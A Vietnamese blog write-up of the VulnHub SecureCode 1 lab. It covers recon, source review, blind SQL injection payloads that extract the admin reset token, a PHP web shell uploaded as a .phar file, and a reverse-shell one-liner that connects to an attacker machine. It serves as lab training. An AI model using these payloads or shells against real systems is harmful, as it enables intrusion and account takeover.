---
title: SecureCode:1
date: 2025-03-18 12:00:00
tags: [Blog, CTF, Security]
categories: [Công nghệ, Lập trình]
author: Naruto3co
description: Hướng dẫn giải bài lab SecureCode 1 trên VulnHub bằng cách phân tích và khai thác lỗ hổng.
---

<p>Nguồn: <a href="https://www.vulnhub.com/entry/securecode-1,651/" target="_blank">SecureCode 1 - VulnHub</a></p>

<h2>Cài đặt máy ảo</h2>

<h3>1. Chuẩn bị môi trường</h3>
<ul>
  <li>Cài đặt máy ảo và đảm bảo cấu hình card mạng đúng (thường là chế độ NAT hoặc Bridge).</li>
  <li>Sử dụng công cụ <code>nmap</code> để quét và xác định địa chỉ IP của máy ảo.</li>
  <li>Ví dụ lệnh: <code>nmap -sP 192.168.56.0/24</code> (thay đổi dải IP tùy theo mạng của bạn).</li>
</ul>

<p><img src="/images/secureCode1/nmap.png" alt="Kết quả Nmap" /><br>Kết quả quét bằng Nmap</p>
<p><img src="/images/secureCode1/1.png" alt="Giao diện ban đầu" /><br>Giao diện trang web ban đầu</p>

<h3>2. Tìm kiếm đường dẫn</h3>
<ul>
  <li>Sử dụng công cụ như <code>gobuster</code> hoặc <code>dirb</code> để liệt kê các thư mục và file trên máy chủ.</li>
  <li>Ví dụ lệnh: <code>gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt</code>.</li>
</ul>

<p><img src="/images/secureCode1/2.png" alt="Kết quả Gobuster" /><br>Kết quả liệt kê bằng Gobuster</p>

<h3>3. Khám phá ban đầu</h3>
<p>Sau khi quét, tôi tìm thấy một số API nhưng tất cả đều dẫn đến trang đăng nhập:</p>
<ul>
  <li><code>http://192.168.56.101/asset/</code> - Chứa các file JS, CSS, vendor (phụ thuộc của trang web).</li>
  <li><code>http://192.168.56.101/include/</code> - Chứa các file PHP nhưng không thể xem nội dung hay khai thác trực tiếp.</li>
  <li>Các đường dẫn khác:</li>
</ul>
<ul style="margin-left: 20px;">
  <li><code>http://192.168.56.101/index.php</code></li>
  <li><code>http://192.168.56.101/item/</code></li>
  <li><code>http://192.168.56.101/login/</code> (kiểm tra SQL Injection sau).</li>
  <li><code>http://192.168.56.101/profile/</code></li>
  <li><code>http://192.168.56.101/robots.txt</code> (kiểm tra thêm API ẩn).</li>
  <li><code>http://192.168.56.101/server-status</code></li>
  <li><code>http://192.168.56.101/users/</code></li>
</ul>

<p><strong>Nhận xét:</strong> Các API này không mang lại nhiều thông tin hữu ích, tôi cảm thấy bế tắc.</p>

<h3>4. Phát hiện quan trọng</h3>
<p>Sau khi đọc writeup của người khác, tôi phát hiện API ẩn: <code>http://192.168.56.101/source_code.zip</code>.<br>Tải file về để phân tích mã nguồn.</p>

---

<h2>Review mã nguồn</h2>

<p>Sau khi giải nén <code>source_code.zip</code>, tôi bắt đầu xem xét các file quan trọng:</p>

<h3>1. File <code>/include/header.php</code></h3>
<ul>
  <li><strong>Chức năng:</strong> Phân quyền hiển thị nội dung dựa trên <code>id_level</code>.</li>
  <li><strong>Kiểm tra:</strong></li>
  <ul>
    <li>Nếu <code>id_level</code> do người dùng nhập (trong request), có thể thao túng giá trị này.</li>
    <li>Nếu hệ thống tự trả về, cần xem cơ chế lấy dữ liệu để đảm bảo không bị can thiệp.</li>
  </ul>
</ul>

<p><img src="/images/secureCode1/4.png" alt="File header.php" /><br>Phân quyền trong header.php</p>

<h3>2. File <code>/include/isAuthenticated.php</code></h3>
<ul>
  <li><strong>Chức năng:</strong> Kiểm tra xác thực người dùng.</li>
  <li><strong>Logic:</strong> Nếu <code>sil != 1</code>, chuyển hướng về trang đăng nhập. Nhưng <code>header.php</code> lại có <code>sil = 2</code>, cần làm rõ cách xử lý.</li>
</ul>

<p><img src="/images/secureCode1/5.png" alt="File isAuthenticated.php" /><br>Kiểm tra xác thực</p>

<h3>3. Cơ chế đăng nhập (<code>login.php</code>)</h3>
<ul>
  <li><strong>Xử lý:</strong></li>
  <ul>
    <li>Sử dụng <code>mysqli_real_escape_string</code> để lọc dữ liệu đầu vào.</li>
    <li>Dùng prepared statement để tham số hóa truy vấn (an toàn).</li>
    <li>Mật khẩu mã hóa bằng MD5 (lỗi thời, không bảo mật).</li>
  </ul>
  <li><strong>Kết quả:</strong> Dựa trên truy vấn database để xác thực.</li>
</ul>

<p><img src="/images/secureCode1/6.png" alt="Cơ chế login" /><br>Cách xử lý đăng nhập</p>

<p><strong>Nhận xét:</strong> Tất cả các trang đều yêu cầu kiểm tra qua <code>header.php</code> và <code>isAuthenticated.php</code>.</p>
<p><img src="/images/secureCode1/7.png" alt="Kiểm tra bắt buộc" /><br>Kiểm tra bắt buộc trên mọi trang</p>

---

<h2>Nhận định điểm yếu</h2>

<h3>Lỗ hổng SQL Injection</h3>
<ul>
  <li><strong>Vị trí:</strong> File xử lý truy vấn trong <code>/include/</code>.</li>
  <li><strong>Phân tích:</strong></li>
  <ul>
    <li>Hàm <code>mysqli_real_escape_string()</code> lọc ký tự đặc biệt nhưng không chặn được dấu <code>(</code> và <code>)</code>.</li>
    <li>Điều này cho phép tấn công SQL Injection.</li>
  </ul>
</ul>

<p><img src="/images/secureCode1/8.png" alt="Điểm yếu SQL" /><br>Điểm yếu trong truy vấn</p>

<ul>
  <li><strong>Kiểm tra:</strong></li>
  <ul>
    <li>Truy vấn trả về dữ liệu -> HTTP 404.</li>
    <li>Không có dữ liệu -> HTTP 302.</li>
    <li>Trick này có thể đánh lừa công cụ như <code>sqlmap</code>.</li>
  </ul>
</ul>

<p><img src="/images/secureCode1/9.png" alt="Logic kiểm tra" /><br>Logic trả về trạng thái</p>

---

<h2>Tấn công</h2>

<h3>1. Khai thác SQL Injection</h3>
<p><strong>Mục tiêu:</strong> Lấy thông tin từ database (tên database, token, v.v.).</p>
<p><strong>Payload mẫu:</strong></p>
<pre><code>and ascii(substr(database(),1,1)) = 104 -- -</code></pre>
<ul>
  <li><strong>Giải thích:</strong></li>
  <ul>
    <li><code>database()</code>: Trả về tên database.</li>
    <li><code>substr(database(),1,1)</code>: Lấy ký tự đầu tiên.</li>
    <li><code>ascii()</code>: Chuyển ký tự thành mã ASCII.</li>
    <li>So sánh với 104 (chữ <code>h</code>) để đoán từng ký tự.</li>
  </ul>
  <li><strong>URL:</strong> <code>http://192.168.56.101/item/viewItem.php?id=1%20and%20ascii%28substr%28database%28%29%2C1%2C1%29%29%20%3D%20104%20--%20-</code>.</li>
</ul>

<p><strong>Thử nghiệm:</strong></p>
<ul>
  <li>Dùng Burp Suite để thay đổi giá trị ASCII (từ 30-130) và đoán tên database.</li>
  <li><strong>Kết quả:</strong> Biết tên database nhưng chưa đủ để khai thác sâu hơn.</li>
</ul>

<p><strong>Payload nâng cao:</strong></p>
<pre><code>1 and ascii(substr((SELECT token FROM user WHERE id = 1),1,1)) = 111 -- -</code></pre>
<ul>
  <li><strong>Mục tiêu:</strong> Lấy token của user <code>id = 1</code> (admin).</li>
  <li><strong>Kiểm tra:</strong> Token chỉ được sinh ra khi yêu cầu quên mật khẩu.</li>
</ul>

<p><img src="/images/secureCode1/11.png" alt="Quên mật khẩu" /><br>Yêu cầu quên mật khẩu</p>
<p><img src="/images/secureCode1/12.png" alt="Token sinh ra" /><br>Token được sinh ra</p>
<p><img src="/images/secureCode1/13.png" alt="Kết quả token" /><br>Kết quả khai thác token</p>

<p><strong>Kết quả:</strong> Đăng nhập thành công với token admin.</p>
<p><img src="/images/secureCode1/14.png" alt="Đăng nhập admin" /><br>Đăng nhập tài khoản admin</p>
<p><img src="/images/secureCode1/15.png" alt="Giao diện admin" /><br>Giao diện quản trị</p>

<h3>2. Tấn công upload file (RCE)</h3>
<p><strong>Mục tiêu:</strong> Tải file độc hại lên để thực thi lệnh từ xa (Remote Code Execution).</p>
<p><strong>Khám phá:</strong> Giao diện admin cho phép thêm/sửa item, bao gồm upload file.</p>
<p><img src="/images/secureCode1/16.png" alt="Chức năng admin" /><br>Chức năng quản trị</p>

<p><strong>Phân tích mã nguồn:</strong></p>
<ul>
  <li><strong>Thêm item (<code>newItem.php</code>):</strong></li>
  <ul>
    <li>Có kiểm tra whitelist (<code>image/jpeg</code>, <code>image/png</code>, <code>image/gif</code>).</li>
    <li>Dùng blacklist (không tối ưu, dễ bị bỏ sót).</li>
  </ul>
  <p><img src="/images/secureCode1/17.png" alt="Code newItem" /><br>Kiểm tra đầu vào newItem</p>
</ul>
<ul>
  <li><strong>Sửa item (<code>editItem.php</code>):</strong></li>
  <ul>
    <li>Chỉ dùng blacklist, không có whitelist -> dễ bị bypass.</li>
  </ul>
  <p><img src="/images/secureCode1/18.png" alt="Code editItem" /><br>Kiểm tra đầu vào editItem</p>
</ul>

<p><strong>Payload:</strong> Tạo file <code>payload.phar</code>:</p>
<pre><code>&lt;?php
if (isset($_REQUEST['cmd'])) {
    echo "&lt;pre&gt;";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "&lt;/pre&gt;";
    die;
}
?&gt;</code></pre>
<ul>
  <li><strong>Lý do chọn <code>.phar</code>:</strong></li>
  <ul>
    <li>Định dạng PHP Archive, ít bị chú ý hơn <code>.php</code>.</li>
    <li>Các định dạng khác như <code>.php7</code>, <code>.phps</code> không hoạt động trong lab này.</li>
  </ul>
</ul>

<p><strong>Thực hiện:</strong></p>
<ul>
  <li>Upload <code>payload.phar</code> qua chức năng edit item.</li>
  <li>Truy cập: <code>http://192.168.56.101/item/image/payload.phar?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.56.103%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</code>.</li>
</ul>

<p><img src="/images/secureCode1/19.png" alt="Upload thành công" /><br>Upload file thành công</p>

<p><strong>Giải thích lệnh:</strong></p>
<pre><code>php -r '$sock=fsockopen("192.168.56.103",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></pre>
<ul>
  <li>Mở socket kết nối đến máy attacker (192.168.56.103:1234).</li>
  <li>Chạy shell tương tác, gửi stdin/stdout/stderr qua socket.</li>
</ul>

<p><strong>Kết quả:</strong></p>
<ul>
  <li>Dùng <code>nc -lvnp 1234</code> trên máy Kali để lắng nghe.</li>
  <li>Kết nối thành công và truy cập shell.</li>
</ul>

<p><img src="/images/secureCode1/20.png" alt="Kết nối shell" /><br>Kết nối shell thành công</p>
<p><img src="/images/secureCode1/21.png" alt="Shell hoạt động" /><br>Shell hoạt động</p>

<p><strong>Tìm flag:</strong> Dễ dàng tìm thấy thư mục chứa cờ.</p>
<p><img src="/images/secureCode1/22.png" alt="Flag" /><br>Flag của bài lab</p>

---

<h2>Kết luận</h2>
<ul>
  <li>Bài lab SecureCode 1 là một thử thách thú vị với hai lỗ hổng chính: <strong>SQL Injection</strong> và <strong>File Upload dẫn đến RCE</strong>.</li>
  <li><strong>Kinh nghiệm rút ra:</strong> Luôn kiểm tra kỹ mã nguồn, không bỏ qua các API ẩn, và ưu tiên whitelist thay vì blacklist khi lọc đầu vào.</li>
</ul>